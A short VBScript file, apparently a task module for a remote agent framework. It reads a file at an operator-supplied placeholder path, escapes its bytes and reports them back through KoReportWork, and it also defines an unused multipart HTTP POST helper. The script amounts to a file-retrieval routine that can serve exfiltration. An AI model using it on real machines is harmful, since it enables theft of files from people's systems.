Function WinHTTPPostRequest(URL, FormData, Boundary)
  Dim http 'As New MSXML2.XMLHTTP

  'Create XMLHTTP/ServerXMLHTTP/WinHttprequest object
  'You can use any of these three objects.
  Set http = CreateObject("WinHttp.WinHttprequest.5.1")
  'Set http = CreateObject("MSXML2.XMLHTTP")
  'Set http = CreateObject("MSXML2.ServerXMLHTTP")

  'Open URL As POST request
  http.Open "POST", URL, False

  'Set Content-Type header
  http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" + Boundary

  'Send the form data To URL As POST binary request

  MsgBox Len(formdata)
  http.send FormData

  'Get a result of the script which has received upload
  WinHTTPPostRequest = http.responseText
End Function

path = KoGetPath("~RFILE~")
data = KoReadBinaryFile(path)

MsgBox len(data)
data = Replace(data, chr(92), "\\", 1, -1, 0)
data = Replace(data, chr(0), "\0", 1, -1, 0)
MsgBox len(data)

KoReportWork data
KoExit
